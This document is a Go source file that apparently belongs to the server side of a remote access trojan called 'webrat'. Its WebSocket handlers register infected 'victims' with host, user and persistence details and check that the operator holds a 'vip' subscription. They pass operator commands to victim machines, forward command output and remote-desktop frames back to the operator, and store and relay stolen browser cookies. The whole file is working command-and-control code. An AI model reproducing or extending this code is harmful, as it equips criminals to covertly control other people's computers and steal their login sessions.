package ws

import (
	"encoding/json"
	"log"
	"strings"
	"time"

	"webrat-go-api/internal/stealstore"
	"webrat-go-api/internal/storage"

	"github.com/gorilla/websocket"
)

func (h *Hub) handleRegister(ws *websocket.Conn, payload map[string]any, ownerLogin, token, ip string) (victimID string) {
	id := strFrom(payload["id"])
	log.Printf("[ws:register] id=%q owner=%q token=%q ip=%s", id, ownerLogin, token, ip)
	if id == "" {
		log.Printf("[ws:register] rejected: empty id ip=%s", ip)
		return ""
	}
	if strings.TrimSpace(token) == "" || strings.TrimSpace(ownerLogin) == "" {
		log.Printf("[ws:register] rejected: empty token/owner ip=%s token=%q owner=%q", ip, token, ownerLogin)
		_ = ws.Close()
		return ""
	}

	h.mu.RLock()
	banned := h.bannedVictimIDs[id]
	h.mu.RUnlock()
	if h.db != nil {
		if ok, err := h.db.IsVictimBanned(id); err == nil {
			if ok {
				banned = true
				h.mu.Lock()
				h.bannedVictimIDs[id] = true
				h.mu.Unlock()
			} else if banned {
				h.mu.Lock()
				delete(h.bannedVictimIDs, id)
				h.mu.Unlock()
				banned = false
			}
		}
	}
	if banned {
		_ = ws.Close()
		return ""
	}

	resolvedOwner := strings.TrimSpace(ownerLogin)
	if resolvedOwner == "" {
		resolvedOwner = strings.ToLower(strings.TrimSpace(strFrom(payload["owner"])))
	}
	if resolvedOwner == "" {
		_ = ws.Close()
		return ""
	}
	if h.db != nil {
		status, _, _, err := h.db.GetSubscription(resolvedOwner)
		if err != nil || status != "vip" {
			_ = ws.Close()
			return ""
		}
	}

	if !h.lim.allowRegister(resolvedOwner, ip) {
		m := h.getConnMutex(ws)
		m.Lock()
		_ = ws.SetWriteDeadline(time.Now().Add(2 * time.Second))
		_ = ws.WriteControl(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.ClosePolicyViolation, "rate limit"), time.Now().Add(2*time.Second))
		m.Unlock()
		_ = ws.Close()
		return ""
	}

	v := &storage.Victim{
		ID:               id,
		Hostname:         strFrom(payload["hostname"]),
		User:             strFrom(payload["user"]),
		IP:               strFrom(payload["ip"]),
		Comment:          strFrom(payload["comment"]),
		BuildID:          strFrom(payload["buildId"]),
		OS:               strFrom(payload["os"]),
		CPU:              strFrom(payload["cpu"]),
		GPU:              strFrom(payload["gpu"]),
		RAM:              strFrom(payload["ram"]),
		Country:          strFrom(payload["country"]),
		DeviceType:       strFrom(payload["deviceType"]),
		Admin:            boolFrom(payload["admin"]),
		Owner:            resolvedOwner,
		LastActive:       time.Now(),
		Online:           true,
		BuildVersion:     strFrom(payload["version"]),
		AutorunMode:      strFrom(payload["autorunMode"]),
		InstallPath:      strFrom(payload["installPath"]),
		HideFilesEnabled: boolFrom(payload["hideFilesEnabled"]),
	}
	if delayVal, ok := payload["startupDelaySeconds"]; ok {
		if f, ok2 := delayVal.(float64); ok2 {
			v.StartupDelaySeconds = int(f)
		}
	}

	if h.db != nil {
		_ = h.db.UpsertVictim(v)
	}

	h.mu.Lock()
	h.victims[id] = v
	h.victimSockets[id] = ws
	h.victimOwnersByConn[ws] = strings.ToLower(strings.TrimSpace(v.Owner))
	h.mu.Unlock()

	h.broadcastVictims()
	return id
}

func (h *Hub) handleUpdate(payload map[string]any) {
	id := strFrom(payload["id"])
	if id == "" {
		return
	}
	windowTitle := strFrom(payload["window"])

	var victimCopy *storage.Victim
	h.mu.Lock()
	if v, ok := h.victims[id]; ok {
		v.Window = windowTitle
		v.LastActive = time.Now()
		v.Online = true
		vv := *v
		victimCopy = &vv
	}
	h.mu.Unlock()

	if victimCopy != nil && h.db != nil {
		now := time.Now()
		if h.lim.shouldPersist(id, now) {
			_ = h.db.UpsertVictim(victimCopy)
		}
	}

	h.broadcastVictims()
}

func (h *Hub) handlePing(ws *websocket.Conn, associatedVictimID string) {
	var victimCopy *storage.Victim
	pingVictimID := ""
	h.mu.Lock()
	if associatedVictimID != "" {
		if v, ok := h.victims[associatedVictimID]; ok {
			if h.victimSockets[associatedVictimID] == ws {
				now := time.Now()
				v.LastActive = now
				v.Online = true
				vv := *v
				victimCopy = &vv
				pingVictimID = associatedVictimID
			}
		}
	}
	if victimCopy == nil {
		for id, c := range h.victimSockets {
			if c == ws {
				if v, ok := h.victims[id]; ok {
					now := time.Now()
					v.LastActive = now
					v.Online = true
					vv := *v
					victimCopy = &vv
					pingVictimID = id
					break
				}
			}
		}
	}
	h.mu.Unlock()

	if victimCopy != nil && h.db != nil {
		now := time.Now()
		if h.lim.shouldPersist(pingVictimID, now) {
			_ = h.db.UpsertVictim(victimCopy)
		}
	}
}

func (h *Hub) handleCommand(ws *websocket.Conn, payload map[string]any, panelLogin string) {
	if panelLogin == "" {
		return
	}
	if h.db != nil {
		status, _, _, err := h.db.GetSubscription(panelLogin)
		if err != nil || status != "vip" {
			_ = ws.Close()
			return
		}
	}
	victimID := strFrom(payload["victim_id"])
	if victimID == "" {
		return
	}

	h.mu.RLock()
	v := h.victims[victimID]
	h.mu.RUnlock()
	if v == nil || strings.ToLower(strings.TrimSpace(v.Owner)) != strings.ToLower(strings.TrimSpace(panelLogin)) {
		return
	}

	h.mu.RLock()
	victimConn := h.victimSockets[victimID]
	h.mu.RUnlock()
	if victimConn == nil {
		return
	}

	b, err := json.Marshal(payload)
	if err != nil {
		return
	}
	m := h.getConnMutex(victimConn)
	m.Lock()
	_ = victimConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
	_ = victimConn.WriteMessage(websocket.TextMessage, b)
	m.Unlock()
}

func (h *Hub) handleCmdOutput(ws *websocket.Conn, payload map[string]any) {
	b, err := json.Marshal(payload)
	if err != nil {
		return
	}
	h.mu.RLock()
	for clientConn := range h.clients {
		owner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
		victOwner := strings.ToLower(strings.TrimSpace(h.victimOwnersByConn[ws]))
		if owner == "" || owner != victOwner {
			continue
		}
		m := h.getConnMutex(clientConn)
		m.Lock()
		_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
		_ = clientConn.WriteMessage(websocket.TextMessage, b)
		m.Unlock()
	}
	h.mu.RUnlock()
}

func (h *Hub) handleRDFrame(ws *websocket.Conn, payload map[string]any, associatedVictimID string) {
	victID := associatedVictimID
	if victID == "" {
		h.mu.RLock()
		for id, c := range h.victimSockets {
			if c == ws {
				victID = id
				break
			}
		}
		h.mu.RUnlock()
	}
	if victID == "" {
		return
	}
	payload["victim_id"] = victID
	b, err := json.Marshal(payload)
	if err != nil {
		return
	}
	h.mu.RLock()
	for clientConn := range h.clients {
		owner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
		victOwner := strings.ToLower(strings.TrimSpace(h.victimOwnersByConn[ws]))
		if owner == "" || owner != victOwner {
			continue
		}
		m := h.getConnMutex(clientConn)
		m.Lock()
		_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
		_ = clientConn.WriteMessage(websocket.TextMessage, b)
		m.Unlock()
	}
	h.mu.RUnlock()
}

func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
	// Find victim ID from connection
	h.mu.RLock()
	var victimID string
	for id, c := range h.victimSockets {
		if c == ws {
			victimID = id
			break
		}
	}
	h.mu.RUnlock()

	log.Printf("[ws:steal_result] victimID=%s payload=%v", victimID, payload)

	if victimID == "" {
		log.Printf("[ws:steal_result] victimID is empty")
		return
	}

	dataStr := strFrom(payload["data"])
	autoSteal := strFrom(payload["auto_steal"])

	log.Printf("[ws:steal_result] victimID=%s dataStr_len=%d autoSteal=%s", victimID, len(dataStr), autoSteal)

	if dataStr == "" {
		log.Printf("[ws:steal_result] dataStr is empty")
		return
	}

	// Parse browser data
	var browsers map[string]string
	if err := json.Unmarshal([]byte(dataStr), &browsers); err != nil {
		log.Printf("[ws] steal_result bad data from %s: %v", victimID, err)
		return
	}

	for browserName, cookies := range browsers {
		if cookies == "" {
			continue
		}
		if err := stealstore.SaveResult(victimID, browserName, cookies); err != nil {
			log.Printf("[ws] steal save error %s/%s: %v", victimID, browserName, err)
		}
	}

	if err := stealstore.UpdateMeta(victimID, autoSteal); err != nil {
		log.Printf("[ws] steal meta error %s: %v", victimID, err)
	}

	// Relay to panel owner
	h.mu.RLock()
	v := h.victims[victimID]
	var owner string
	if v != nil {
		owner = strings.ToLower(strings.TrimSpace(v.Owner))
	}

	stealTime := time.Now().Format("02.01.2006, 15:04:05")

	relay := map[string]any{
		"type":       "steal_result",
		"victim_id":  victimID,
		"steal_time": stealTime,
	}
	relayB, _ := json.Marshal(relay)

	for clientConn := range h.clients {
		clientOwner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
		if clientOwner == "" || clientOwner != owner {
			continue
		}
		m := h.getConnMutex(clientConn)
		m.Lock()
		_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
		_ = clientConn.WriteMessage(websocket.TextMessage, relayB)
		m.Unlock()
	}
	h.mu.RUnlock()

	log.Printf("[ws] steal_result saved for %s (%d browsers)", victimID, len(browsers))
}
